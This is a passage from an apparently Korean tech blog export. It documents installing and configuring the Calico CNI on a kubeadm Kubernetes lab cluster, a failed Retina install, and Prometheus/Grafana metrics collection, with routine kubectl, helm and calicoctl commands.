문제입니다(?).\n(1) CRD 설치 원래 파일을 받아서 적용하는 걸 좋아하는데\u0026hellip;\n직접 해보니, 이건 얌전히 create를 추천드립니다. 살짝 당황스러웠습니다.\n# SET CALICO_VERSION_NAME # ref. https://github.com/projectcalico/calico/tags CALICO_VERSION_TAG=v3.28.2 \u0026amp;\u0026amp; echo $CALICO_VERSION_TAG # v3.28.2 kubectl create -f https://raw.githubusercontent.com/projectcalico/calico/${CALICO_VERSION_TAG}/manifests/tigera-operator.yaml tigera-operator Namespace 및 CRD, SA, Deployment가 생성됩니다.\n하지만, CoreDNS의 상태는 당연히 아직 Pending입니다.\n(⎈|HomeLab:default) root@k8s-m:~# kubectl get pod -n kube-system NAME READY STATUS RESTARTS AGE coredns-55cb58b774-62vtz 0/1 Pending 0 21m coredns-55cb58b774-l8znv 0/1 Pending 0 21m (2) Custom 설정 적용 수정에 있어 yq를 사용하였습니다. mikefarah/yq@v4\n아래와 같이 custom-resource.yaml 파일을 받아, Calico 구성[4]을 합니다.\ncurl https://raw.githubusercontent.com/projectcalico/calico/${CALICO_VERSION_TAG}/manifests/custom-resources.yaml -sSo custom-resources-$(date --iso-8601).yaml ls | grep custom-resources # custom-resources-2024-09-22.yaml 주로 수정되는 부분은 calicoNetwork.ippools의 blockSize와 cidr, encapsulation입니다.\n# mikefarah/yq pre-installed (\u0026gt;=v4) yq \u0026#39;(select(.kind == \u0026#34;Installation\u0026#34;) | .spec.calicoNetwork.ipPools[0] | (.blockSize, .cidr, .encapsulation))\u0026#39; custom-resources-2024-09-23.yaml 26 192.168.0.0/16 VXLANCrossSubnet 실제 적용 시 경험했던 트러블은 kubeadm init 시 설정한 pod-network-cidr를 알아내는 방법이었는데,\n아래와 같이 ConfigMap을 조회하여 알아낼 수 있었습니다.\nkubectl get configmap -n kube-system kubeadm-config -o yaml | grep podSubnet # podSubnet: 172.16.0.0/16 blockSize: IP Pool의 크기, 26은 64개의 IP이므로 24(256개)로 변경해보겠습니다. cidr: kubeadmin init 시 설정한 pod-network-cidr (이번의 경우, 172.16.0.0/16) encapsulation[5]: 아래 중 하나를 고를 수 있습니다. IPIP, VXLAN, IPIPCrossSubnet, VXLANCrossSubnet, None(Optional) yq \u0026#39;with(select(.kind == \u0026#34;Installation\u0026#34;).spec.calicoNetwork.ipPools[0] ; .blockSize = 24 | .cidr = \u0026#34;172.16.0.0/16\u0026#34; | .encapsulation = \u0026#34;IPIP\u0026#34;)\u0026#39; custom-resources-2024-09-23.yaml -i 이제 비로소 적용을 할 수 있습니다.\nkubectl create -f custom-resources-2024-09-23.yaml # installation.operator.tigera.io/default created # apiserver.operator.tigera.io/default created 편-안. 오늘 잠은 잘 자겠군요.\nkubectl get pod -A --sort-by=.metadata.creationTimestamp # NAMESPACE NAME READY STATUS RESTARTS AGE # kube-system kube-scheduler-k8s-m 1/1 Running 0 30h # kube-system kube-controller-manager-k8s-m 1/1 Running 0 30h # kube-system kube-apiserver-k8s-m 1/1 Running 0 30h # kube-system etcd-k8s-m 1/1 Running 0 30h # kube-system coredns-55cb58b774-62vtz 1/1 Running 0 30h # kube-system kube-proxy-zj6tv 1/1 Running 0 30h # kube-system coredns-55cb58b774-l8znv 1/1 Running 0 30h # kube-system kube-proxy-ct678 1/1 Running 0 30h # kube-system kube-proxy-qbp9m 1/1 Running 0 30h # kube-system kube-proxy-gqzw9 1/1 Running 0 30h # tigera-operator tigera-operator-576646c5b6-z6kkb 1/1 Running 0 30h # calico-system calico-node-rdvhh 1/1 Running 0 103s # calico-system csi-node-driver-hjms8 2/2 Running 0 103s # calico-system csi-node-driver-hf2md 2/2 Running 0 103s # calico-system csi-node-driver-cvrsj 2/2 Running 0 103s # calico-system csi-node-driver-8bm8w 2/2 Running 0 103s # calico-system calico-typha-64b97658dd-2nfhq 1/1 Running 0 103s # calico-system calico-node-q5x2w 1/1 Running 0 103s # calico-system calico-node-hx2xv 1/1 Running 0 103s # calico-system calico-node-grtwc 1/1 Running 0 103s # calico-system calico-kube-controllers-66fd48f858-xbrhp 1/1 Running 0 103s # calico-system calico-typha-64b97658dd-g7c29 1/1 Running 0 94s # calico-apiserver calico-apiserver-69f798bcb-g6gmq 1/1 Running 0 38s # calico-apiserver calico-apiserver-69f798bcb-tst89 1/1 Running 0 38s kubeadm에서 설정한 pod-network-cidr과 일치하지 않으면, 아래와 같은 에러가 발생합니다.\n(참고) Manifests 기본 설정값 둘러보기 잠시 Manifests 설치 방식을 살펴보겠습니다.\nv3.28.2 버전 기준, L4924-4935를 살펴보면, IPIP Mode가 기본 활성화 되어있음을 알 수 있습니다.\ncurl https://raw.githubusercontent.com/projectcalico/calico/v3.28.2/manifests/calico.yaml -sSq | sed -n \u0026#39;4924,4935p\u0026#39; # Auto-detect the BGP IP address. - name: IP value: \u0026#34;autodetect\u0026#34; # Enable IPIP - name: CALICO_IPV4POOL_IPIP value: \u0026#34;Always\u0026#34; # Enable or Disable VXLAN on the default IP pool. - name: CALICO_IPV4POOL_VXLAN value: \u0026#34;Never\u0026#34; # Enable or Disable VXLAN on the default IPv6 IP pool. - name: CALICO_IPV6POOL_VXLAN value: \u0026#34;Never\u0026#34; 3. Retina 설치 시도 (실패) 아래는 시도 중에 에러로그[6] 보고 미지원 인터페이스로 인해 중단된 내용입니다.\nIPIP모드는 tunl 인터페이스를 사용하는데, 이는 미지원 사항임을 알 수 있었습니다.\n# kubectl logs -n kube-system retina-agent-866h7 ts=2024-09-23T15:53:59.761Z level=error caller=linuxutil/ethtool_stats_linux.go:78 msg=\u0026#34;Error while getting ethtool:\u0026#34; ifacename=tunl0 error=\u0026#34;interface not supported while retrieving stats: operation not supported\u0026#34; errorVerbose=\u0026#34;operation not supported\\ninterface not supported while retrieving stats\\ngithub.com/microsoft/retina/pkg/plugin/linuxutil.(*CachedEthtool).Stats\\n\\t/go/src/github.com/microsoft/retina/pkg/plugin/linuxutil/ethtool_handle_linux.go:45\\ngithub.com/microsoft/retina/pkg/plugin/linuxutil.(*EthtoolReader).readInterfaceStats\\n\\t/go/src/github.com/microsoft/retina/pkg/plugin/linuxutil/ethtool_stats_linux.go:73\\ngithub.com/microsoft/retina/pkg/plugin/linuxutil.(*EthtoolReader).readAndUpdate\\n\\t/go/src/github.com/microsoft/retina/pkg/plugin/linuxutil/ethtool_stats_linux.go:43\\ngithub.com/microsoft/retina/pkg/plugin/linuxutil.(*linuxUtil).run.func2\\n\\t/go/src/github.com/microsoft/retina/pkg/plugin/linuxutil/linuxutil_linux.go:109\\nruntime.goexit\\n\\t/usr/local/go/src/runtime/asm_amd64.s:1695\u0026#34; Network Monitoring Tool인 Retina를 설치해봅니다.\nHelm이 있어야합니다. 공식 Docs가 제일 정확합니다. (1) Helm chart 설치 링크: https://retina.sh/docs/Installation/Setup Basic Mode 로 진행해보겠습니다.\n# Set the version to a specific version here or get latest version from GitHub API. VERSION=$( curl -sL https://api.github.com/repos/microsoft/retina/releases/latest | jq -r .name) helm upgrade --install retina oci://ghcr.io/microsoft/retina/charts/retina \\ --version $VERSION \\ --set image.tag=$VERSION \\ --set operator.tag=$VERSION \\ --set logLevel=info \\ --set enabledPlugin_linux=\u0026#34;\\[dropreason\\,packetforward\\,linuxutil\\,dns\\]\u0026#34; 다음과 같은 출력값이 나옵니다.\nRelease \u0026#34;retina\u0026#34; does not exist. Installing it now. Pulled: ghcr.io/microsoft/retina/charts/retina:v0.0.16 Digest: sha256:384e4b45d37ab49b6e2e742012e3d49230ce2be102895dccb504b42540091419 NAME: retina LAST DEPLOYED: Sun Sep 15 19:29:03 2024 NAMESPACE: default STATUS: deployed REVISION: 1 NOTES: 1. Installing retina service using helm: helm install retina ./deploy/legacy/manifests/controller/helm/retina/ --namespace kube-system --dependency-update 2. Cleaning up/uninstalling/deleting retina and dependencies related: (2) Prometheus 설치 앞서 출력값의 NOTES.1을 그대로 치면 에러가 정상적으로 나야합니다. 해당 되는 파일을 받지 않았기 때문입니다.\n에러 로그를 보면, 이 또한 Document를 안내하는 것을 알 수 있습니다. https://github.com/microsoft/retina/blob/3d2c7a55f8c0388df271453f5fc7b166c2f275be/deploy/legacy/prometheus/values.yaml\nPrometheus 커뮤니티 차트를 사용합니다. Legacy 모드로 진행하나, Github를 살펴보니 Hubble을 쓰는 방식도 있는 것 같습니다.\n앞서 언급된 파일의 경로: https://github.com/microsoft/retina/blob/3d2c7a55f8c0388df271453f5fc7b166c2f275be/deploy/legacy/prometheus/values.yaml\nmkdir -p deploy/legacy/prometheus touch deploy/legacy/prometheus/values.yaml # cat \u0026lt;\u0026lt;EOF\u0026gt; deploy/legacy/prometheus/values.yaml # \u0026gt; COPY AND PASTE (대충 위의 values.yaml 내용) # EOF # ADD Prometheus Community Chart Repository helm install prometheus -n kube-system -f deploy/legacy/prometheus/values.yaml prometheus-community/kube-prometheus-stack helm repo update helm install prometheus -n kube-system -f deploy/legacy/prometheus/values.yaml prometheus-community/kube-prometheus-stack # NAME: prometheus # LAST DEPLOYED: Sun Sep 15 19:59:33 2024 # NAMESPACE: kube-system # STATUS: deployed # REVISION: 1 # NOTES: # kube-prometheus-stack has been installed. Check its status by running: # kubectl --namespace kube-system get pods -l \u0026#34;release=prometheus\u0026#34; # # Visit https://github.com/prometheus-operator/kube-prometheus for instructions on how to create \u0026amp; configure Alertmanager and Prometheus instances using the Operator. kubectl --namespace kube-system get pods -l \u0026#34;release=prometheus\u0026#34; # NAME READY STATUS RESTARTS AGE # prometheus-kube-prometheus-operator-64c9474db-sr5bp 1/1 Running 0 67s # prometheus-kube-state-metrics-688d66b5b8-xn7kp 1/1 Running 0 67s # prometheus-prometheus-node-exporter-5lvgp 1/1 Running 0 66s # prometheus-prometheus-node-exporter-98drk 1/1 Running 0 67s # prometheus-prometheus-node-exporter-dfss9 1/1 Running 0 67s # prometheus-prometheus-node-exporter-zr44x 1/1 Running 0 67s NodePort를 생성해서 시도해보기 위해 values.yaml에 아래 두 값을 추가하여[6] 업데이트 했습니다.\nprometheus.service.type: NodePort grafana.service.type: NodePort helm upgrade prometheus -n kube-system -f deploy/legacy/prometheus/values.yaml prometheus-community/kube-prometheus-stack kubectl get secret -n kube-system prometheus-grafana -o jsonpath=\u0026#34;{.data.admin-password}\u0026#34; | base64 --decode ; echo # prom-operator kubectl get svc -n kube-system | grep NodePort \u0026lt;!-- prometheus-grafana NodePort 10.200.1.23 \u0026lt;none\u0026gt; 80:32496/TCP 116m prometheus-kube-prometheus-prometheus NodePort 10.200.1.36 \u0026lt;none\u0026gt; 9090:30090/TCP,8080:31038/TCP 116m 그라파나 접속을 위해, PUBLIC_IP:32496으로 접속하여, 웹 대시보드는 확인하였으나\n모든 메트릭이 확인되지 않는 진기한.. 경험을 했습니다.\np8s는 웹UI 접속은 커녕 cURL도 안 먹히는 걸보니 이게 네트워크 인터페이스 문제인지 아니면 유저에러인지 혼동이 되지만,\ntunl 인터페이스가 안된다는 점을 기록하고자 적어보았습니다.\n4. Calico Operator 설치를 위해 시도해봤던 것들 # Error Log 확인을 위한 필수사항 kubectl logs deployment/tigera-operator -n tigera-operator # Error Log를 통해, 알게된 해결법이 아래 사항 kubectl get configmap -n kube-system kubeadm-config -o yaml # kubectl create 후, delete 한다고 해결이 되는 게 아니었음. CRD에서 충돌 # --server-side --force-conflicts 옵션을 사용해서 강제 덮어쓰기를 해야됨 kubectl apply --server-side --force-conflicts -f tigera-operator.yaml kubectl apply --server-side --force-conflicts -f custom-resources.yaml Reference [1] https://docs.tigera.io/calico/latest/getting-started/kubernetes/self-managed-onprem/onpremises#install-calico-with-kubernetes-api-datastore-more-than-50-nodes\n[2] https://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm-init/#options\n[3] https://docs.tigera.io/calico/latest/network-policy/encrypt-cluster-pod-traffic\n[4] https://docs.tigera.io/calico/latest/reference/installation/api#operator.tigera.io/v1.IPPool\n[5] https://docs.tigera.io/calico/latest/reference/installation/api#operator.tigera.io/v1.EncapsulationType\n[6] https://medium.com/@muppedaanvesh/a-hands-on-guide-to-kubernetes-monitoring-using-prometheus-grafana-%EF%B8%8F-b0e00b1ae039\n[그외]\nhttps://stackoverflow.com/questions/69190171/calico-kube-controllers-and-calico-node-are-not-ready-crashloopbackoff https://serverfault.com/questions/1138767/calico-node-and-kube-proxy-crashed-permanently-on-a-new-node https://mrmaheshrajput.medium.com/deploy-kubernetes-cluster-on-aws-ec2-instances-f3eeca9e95f1 https://tech.osci.kr/%EC%BF%A0%EB%B2%84%EB%84%A4%ED%8B%B0%EC%8A%A4-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-calico/ https://github.com/projectcalico/calico/issues/7538 https://github.com/projectcalico/calico/issues/6407 https://github.com/projectcalico/calico/issues/3878 https://github.com/projectcalico/calico/issues/7890 https://github.com/projectcalico/calico/issues/4218 https://github.com/projectcalico/calico/issues/7826 https://dev.to/prakashvra/how-to-setup-a-kubernetes-cluster-on-aws-ec2-using-kubeadm-containerd-and-calico-560o ","date":"2024-09-18T20:52:16+09:00","permalink":"https://blog.minseong.xyz/post/kans-3w-calico-operator/","section":"post","tags":["kans","cni","calico","kubernetes"],"title":"Calico Installation in Operator Mode"},{"categories":null,"contents":"CloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n1. Calico 설치 스터디에서 AWS CF 및 Calico 설치 스크립트(Manifest)를 제공하였기에, 이 부분은 참고만 하시기 바랍니다.\nCNI가 설치되지 않았기에 NotReady 상태에 있다가, Calico 설치하면 CoreDNS가 설정되며, Ready 상태로 변경된다.\nCalico 설치 전\n# Control Plane and worker nodes are not ready (⎈|HomeLab:default) root@k8s-m:~# kubectl get nodes NAME STATUS ROLES AGE VERSION k8s-m NotReady control-plane 32m v1.30.5 k8s-w0 NotReady \u0026lt;none\u0026gt; 31m v1.30.5 k8s-w1 NotReady \u0026lt;none\u0026gt; 31m v1.30.5 k8s-w2 NotReady \u0026lt;none\u0026gt; 31m v1.30.5 # Count for iptalbes rules for comparison (⎈|HomeLab:default) root@k8s-m:~# iptables -t filter -L | wc -l 50 (⎈|HomeLab:default) root@k8s-m:~# iptables -t nat -L | wc -l 48 (⎈|HomeLab:default) root@k8s-m:~# kubectl get pod -A --sort-by=.metadata.creationTimestamp NAMESPACE NAME READY STATUS RESTARTS AGE kube-system etcd-k8s-m 1/1 Running 0 35m kube-system kube-apiserver-k8s-m 1/1 Running 0 35m kube-system kube-controller-manager-k8s-m 1/1 Running 0 35m kube-system kube-scheduler-k8s-m 1/1 Running 0 35m kube-system coredns-55cb58b774-bscbt 0/1 Pending 0 35m kube-system coredns-55cb58b774-w22zq 0/1 Pending 0 35m kube-system kube-proxy-5hgmn 1/1 Running 0 35m kube-system kube-proxy-bnv77 1/1 Running 0 35m kube-system kube-proxy-xf8q7 1/1 Running 0 35m kube-system kube-proxy-hzsnk 1/1 Running 0 35m Calico 설치 후\n(⎈|HomeLab:default) root@k8s-m:~# kubectl get nodes NAME STATUS ROLES AGE VERSION k8s-m Ready control-plane 45m v1.30.5 k8s-w0 Ready \u0026lt;none\u0026gt; 45m v1.30.5 k8s-w1 Ready \u0026lt;none\u0026gt; 45m v1.30.5 k8s-w2 Ready \u0026lt;none\u0026gt; 45m v1.30.5 (⎈|HomeLab:default) root@k8s-m:~# iptables -t filter -L | wc -l 210 (⎈|HomeLab:default) root@k8s-m:~# iptables -t nat -L | wc -l 126 (⎈|HomeLab:default) root@k8s-m:~# kubectl get pod -A --sort-by=.metadata.creationTimestamp NAMESPACE NAME READY STATUS RESTARTS AGE kube-system etcd-k8s-m 1/1 Running 0 37m kube-system kube-scheduler-k8s-m 1/1 Running 0 37m kube-system kube-controller-manager-k8s-m 1/1 Running 0 37m kube-system kube-apiserver-k8s-m 1/1 Running 0 37m kube-system coredns-55cb58b774-w22zq 1/1 Running 0 36m kube-system coredns-55cb58b774-bscbt 1/1 Running 0 36m kube-system kube-proxy-5hgmn 1/1 Running 0 36m kube-system kube-proxy-bnv77 1/1 Running 0 36m kube-system kube-proxy-xf8q7 1/1 Running 0 36m kube-system kube-proxy-hzsnk 1/1 Running 0 36m kube-system calico-node-xsqfv 1/1 Running 0 57s kube-system calico-node-ttxcv 1/1 Running 0 57s kube-system calico-node-6x5zq 1/1 Running 0 57s kube-system calico-kube-controllers-77d59654f4-vl8sv 1/1 Running 0 56s kube-system calico-node-cqjxm 1/1 Running 0 56s Calico 설치 스크립트를 통해 아래와 같은 변화가 주어집니다.\npoddisruptionbudget.policy/calico-kube-controllers created serviceaccount/calico-kube-controllers created serviceaccount/calico-node created serviceaccount/calico-cni-plugin created configmap/calico-config created customresourcedefinition.apiextensions.k8s.io/bgpconfigurations.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/bgpfilters.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/bgppeers.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/blockaffinities.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/caliconodestatuses.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/clusterinformations.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/felixconfigurations.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/globalnetworkpolicies.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/globalnetworksets.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/hostendpoints.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/ipamblocks.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/ipamconfigs.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/ipamhandles.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/ippools.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/ipreservations.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/kubecontrollersconfigurations.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/networkpolicies.crd.projectcalico.org created customresourcedefinition.apiextensions.k8s.io/networksets.crd.projectcalico.org created clusterrole.rbac.authorization.k8s.io/calico-kube-controllers created clusterrole.rbac.authorization.k8s.io/calico-node created clusterrole.rbac.authorization.k8s.io/calico-cni-plugin created clusterrolebinding.rbac.authorization.k8s.io/calico-kube-controllers created clusterrolebinding.rbac.authorization.k8s.io/calico-node created clusterrolebinding.rbac.authorization.k8s.io/calico-cni-plugin created daemonset.apps/calico-node created deployment.apps/calico-kube-controllers created (Optional) calicoctl 설치 이외에도 Calico 사용을 위해 calicoctl 을 설치했습니다.\n이후에 Calico 메트릭을 p8s로 전송하기 위해 Calico에서 설정을 해야하는데, kubectl 대신 calicoctl을 사용해보기로 했습니다.\nchmod +x calicoctl \u0026amp;\u0026amp; mv calicoctl /usr/bin calicoctl version % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 100 64.4M 100 64.4M 0 0 21.2M 0 0:00:03 0:00:03 --:--:-- 40.4M Client Version: v3.28.1 Git commit: 601856343 Cluster Version: v3.28.1 Cluster Type: k8s,bgp,kubeadm,kdd 2. Calico to Prometheus 연동 Docs: Tigera/Calico\nPrometheus(이하, p8s)에 Calico 메트릭을 전송하기 위해 설정을 해야합니다.\nCalico 문서에는 전송할 수 있는 3가지 요소에 대해서 설명하고 있습니다.\n문서를 기반으로 의역해보면\nFelix: Calico의 두뇌라고 하는걸로 봐서는 핵심요소로 보입니다. Network Policy를 적용할 모든 머신에서 각각 구동되는 데몬이라고 합니다. Typha: Calico 노드와 Datastore 사이의 통신을 Felix에게 전달하도록 하는 Pods의 옵션 세트라고 합니다. kube-controllers: k8s API 돝기화를 비롯하여 가비지 리소스 수집 등 다양한 control-plane 기능을 담당하는 컨트롤러 세트를 실행하는 파드라고 합니다. Felix 하나만 연결하면 그만일 줄 알았더니 그건 아닌 것 같습니다.\n아래와 같이, 문서와 동일하게 진행해보겠습니다.\n(Calico) Metric Reporting 활성화 (p8s) NS 및 SA 생성 (p8s) 배포 및 구성 (p8s) 대시보드에서 메트릭 확인 및 간단한 그래프 생성 calicoctl 및 Manifest 기준으로 기술합니다.\n이후에는, 앞서 언급한 3가지의 요소의 설정을 수정하여, Felix의 메트릭을 exposed(노출되도록) 설정합니다.\n다만 작업시, 유의해야할 것이 각자 사용 중인 기본 포트가 정해져 있다는 점입니다.\nComponent Default Port Protocol Prerequisites Memo Felix 9091 TCP Y - Typha 9091 TCP N Default Setting Typha(Amazon) 9093 TCP N TYPHA_PROMETHEUS_METRICS_PORT kube-controllers 9094 TCP Y calico-kube-controllers 특히, Typha의 경우, 위에 기술한 것과 같이 Amazon vpc-cni 설정에서 custom 포트가 별도 지정된다고 합니다. 다음 링크를 참조하시기 바랍니다. (Github/amazon-vpc-cni-k8s: v1.6-b001dc6)\nTypha 도 활성하여 했으나, 선택사항이거니와 설치가 되어있지 않아 다루지 않습니다.\n(1) Metric Reporting 활성화 기존 Felix 설정을 확인합니다. 기본값은 비활성화되어 있습니다. (아예 명시되어 있지 않습니다)\ncalicoctl get felixconfiguration -o yaml a. Felix 메트릭 노출을 위한 활성화 및 svc 생성 calicoctl patch felixconfiguration default --patch \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;prometheusMetricsEnabled\u0026#34;: true}}\u0026#39; # Successfully patched 1 \u0026#39;FelixConfiguration\u0026#39; resource 다시 확인합니다. (items.spec.prometheusMetricsEnabled: true)\ncalicoctl get felixconfiguration -o yaml | grep prom # prometheusMetricsEnabled: true Manifest로 Calico를 설칠했기 때문에, kube-system ns에 생성합니다.\ncat \u0026lt;\u0026lt;EOF\u0026gt;felix.yaml apiVersion: v1 kind: Service metadata: name: felix-metrics-svc namespace: kube-system spec: clusterIP: None selector: k8s-app: calico-node ports: - port: 9091 targetPort: 9091 EOF kubectl apply -f felix.yaml # service/felix-metrics-svc created kubectl get svc,ep -n kube-system felix-metrics-svc # NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE # service/felix-metrics-svc ClusterIP None \u0026lt;none\u0026gt; 9091/TCP 101s # NAME ENDPOINTS AGE # endpoints/felix-metrics-svc 192.168.10.10:9091,192.168.10.101:9091,192.168.10.102:9091 + 1 more... 101s b. Typha 메트릭 노출을 위한 활성화 및 svc 생성 Typha는 배포되지 않은 것으로 파악되어 생략합니다. c. kube-controllers 메트릭 노출을 위한 svc 생성 현재 사용 중인 포트를 확인합니다. (tigera/calico: Kubernetes controllers configuration )\ncalicoctl get KubeControllersConfiguration -o yaml | grep prom # prometheusMetricsPort: 9094 # # calicoctl get kubecontollersconfiguration -o yaml # Failed to get resources: resource type \u0026#39;kubecontollersconfiguration\u0026#39; is not supported (Opt.) calicoctl을 통해 해당 포트를 패치할 수 있습니다.\n# custom port: 9095 calicoctl patch kubecontrollersconfiguration default --patch \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;prometheusMetricsPort\u0026#34;: 9095}}\u0026#39; 아래와 같이 서비스를 배포합니다.\n해보니, 이미 있었고 기본값이라 바뀌지 않았다고 확인됩니다.\ncat \u0026lt;\u0026lt;EOF\u0026gt;kube-controller.yaml apiVersion: v1 kind: Service metadata: name: kube-controllers-metrics-svc namespace: kube-system spec: clusterIP: None selector: k8s-app: calico-kube-controllers ports: - port: 9094 targetPort: 9094 EOF kubectl apply -f kube-controller.yaml (2) NS 및 SA 생성 NS: calico-monitoring CR/SA/CRB: calico-prometheus-user cat \u0026lt;\u0026lt;EOF\u0026gt;calico-monitoring.yaml apiVersion: v1 kind: Namespace metadata: name: calico-monitoring labels: app: ns-calico-monitoring role: monitoring EOF kubectl apply -f calico-monitoring.yaml cat \u0026lt;\u0026lt;EOF\u0026gt;calico-prometheus-user.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: calico-prometheus-user rules: - apiGroups: [\u0026#34;\u0026#34;] resources: - endpoints - services - pods verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;] - nonResourceURLs: [\u0026#34;/metrics\u0026#34;] verbs: [\u0026#34;get\u0026#34;] --- apiVersion: v1 kind: ServiceAccount metadata: name: calico-prometheus-user namespace: calico-monitoring --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: calico-prometheus-user roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: calico-prometheus-user subjects: - kind: ServiceAccount name: calico-prometheus-user namespace: calico-monitoring EOF kubectl apply -f calico-prometheus-user.yaml # clusterrole.rbac.authorization.k8s.io/calico-prometheus-user created # serviceaccount/calico-prometheus-user created # clusterrolebinding.rbac.authorization.k8s.io/calico-prometheus-user created (3) 배포 및 구성![ ConfigMap을 생성합니다.\ncat \u0026lt;\u0026lt;EOF\u0026gt;prometheus-config.yaml apiVersion: v1 kind: ConfigMap metadata: name: prometheus-config namespace: calico-monitoring data: prometheus.yml: |- global: scrape_interval: 15s external_labels: monitor: \u0026#39;tutorial-monitor\u0026#39; scrape_configs: - job_name: \u0026#39;prometheus\u0026#39; scrape_interval: 5s static_configs: - targets: [\u0026#39;localhost:9090\u0026#39;] - job_name: \u0026#39;felix_metrics\u0026#39; scrape_interval: 5s scheme: http kubernetes_sd_configs: - role: endpoints relabel_configs: - source_labels: [__meta_kubernetes_service_name] regex: felix-metrics-svc replacement: $1 action: keep - job_name: \u0026#39;felix_windows_metrics\u0026#39; scrape_interval: 5s scheme: http kubernetes_sd_configs: - role: endpoints relabel_configs: - source_labels: [__meta_kubernetes_service_name] regex: felix-windows-metrics-svc replacement: $1 action: keep - job_name: \u0026#39;typha_metrics\u0026#39; scrape_interval: 5s scheme: http kubernetes_sd_configs: - role: endpoints relabel_configs: - source_labels: [__meta_kubernetes_service_name] regex: typha-metrics-svc replacement: $1 action: keep - job_name: \u0026#39;kube_controllers_metrics\u0026#39; scrape_interval: 5s scheme: http kubernetes_sd_configs: - role: endpoints relabel_configs: - source_labels: [__meta_kubernetes_service_name] regex: kube-controllers-metrics-svc replacement: $1 action: keep EOF kubectl apply -f prometheus-config.yaml Calico를 수집할 Prometheus를 배포합니다.\n앞에서 Calico 메트릭을 수집하고, 유효한 ConfigMap을 생성하였습니다.\ncat \u0026lt;\u0026lt;EOF\u0026gt;prometheus-pod.yaml apiVersion: v1 kind: Pod metadata: name: prometheus-pod namespace: calico-monitoring labels: app: prometheus-pod role: monitoring spec: nodeSelector: kubernetes.io/os: linux serviceAccountName: calico-prometheus-user containers: - name: prometheus-pod image: prom/prometheus resources: limits: memory: \u0026#34;128Mi\u0026#34; cpu: \u0026#34;500m\u0026#34; volumeMounts: - name: config-volume mountPath: /etc/prometheus/prometheus.yml subPath: prometheus.yml ports: - containerPort: 9090 volumes: - name: config-volume configMap: name: prometheus-config EOF kubectl apply -f prometheus-pod.yaml 정상적으로 구동되는 지 확인합니다.\nkubectl get pods prometheus-pod -n calico-monitoring # NAME READY STATUS RESTARTS AGE # prometheus-pod 1/1 Running 0 14s (4) 대시보드에서 메트릭 확인 및 간단한 그래프 생성 문서에서는 port-forward를 통해 확인하도록 하지만, AWS EC2에 구축했기에 확인하기가 어렵습니다.\nkubectl port-forward pod/prometheus-pod 9090:9090 -n calico-monitoring\n스터디에서 안내된 방법으로, 확인해보겠습니다.\na. Pod IP를 확인합니다. /graph: 대시보드 /metrics: Grafana 등 p8s 기반 시각화를 위한 메트릭 정보 kubectl get pods prometheus-pod -n calico-monitoring -owide | grep -Eo \u0026#34;([0-9]{1,3}[\\.]){3}[0-9]{1,3}\u0026#34; # 172.16.184.8 # curl 172.16.184.8:9090 # \u0026lt;a href=\u0026#34;/graph\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;. b. NodePort svc를 생성합니다. (외부접속) cat \u0026lt;\u0026lt;EOF\u0026gt;prometheus-dashboard-svc.yaml apiVersion: v1 kind: Service metadata: name: prometheus-dashboard-svc namespace: calico-monitoring spec: type: NodePort selector: app: prometheus-pod role: monitoring ports: - protocol: TCP port: 9090 targetPort: 9090 nodePort: 30001 EOF kubectl apply -f prometheus-dashboard-svc.yaml kubectl get svc,ep -n calico-monitoring # NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE # service/prometheus-dashboard-svc NodePort 10.200.1.45 \u0026lt;none\u0026gt; 9090:30001/TCP 0s # NAME ENDPOINTS AGE # endpoints/prometheus-dashboard-svc 172.16.184.8:9090 0s 아래 커맨드를 쳐서 나오는 URL로 웹 브라우저에서 확인을 합니다.\necho -e \u0026#34;Prometheus URL = http://$(curl -s ipinfo.io/ip):30001/graph\u0026#34; # Prometheus URL = http://3.35.169.117:30001/graph Target에서 felix_metrics가 잡힌 것을 확인하였습니다.\n","date":"2024-09-15T18:40:22+09:00","permalink":"https://blog.minseong.xyz/post/kans-3w-calico-overview/","section":"post","tags":["kans","cni","calico","kubernetes","prometheus"],"title":"Calico 및 메트릭 수집 구성"},{"categories":null,"contents":" 톺아보다(우리말샘) 는 의외로 표준어라고 합니다.\nKIND 설치 이후에 기본적인 내용을 살펴봅니다.\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n0. $KUBECONFIG $KUBECONFIG 환경변수가 없을 경우:\n보통은 ~/.kube 디렉토리가 생성됩니다.\n확인해보니, config 값과 더불어, cache 디렉토리도 확인할 수 있었습니다.\n❯ find ~/.kube -maxdepth 2 -type f -exec ls -ld \u0026#34;{}\u0026#34; \\; -rw------- 1 kkumtree kkumtree 44 Sep 3 21:31 /home/kkumtree/.kube/config ❯ find ~/.kube -maxdepth 2 -type d -exec ls -ld \u0026#34;{}\u0026#34; \\; drwxr-x--- 3 